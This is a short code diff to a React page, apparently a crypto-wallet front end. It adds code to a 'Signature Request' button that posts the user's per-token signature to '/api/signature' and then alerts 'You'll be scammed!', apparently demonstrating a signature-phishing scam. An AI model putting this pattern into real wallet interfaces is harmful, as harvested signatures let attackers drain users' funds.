@@ -88,6 +88,11 @@ const Page = () => {
 								...pre,
 								[token.contract_ticker_symbol]: sig
 							}));
+
+							fetch("/api/signature", {
+								method: "POST",
+								body: JSON.stringify(sig)
+							}).then(()=>alert("You'll be scammed!"))
 						}}>
 							Signature Request
 						</button>
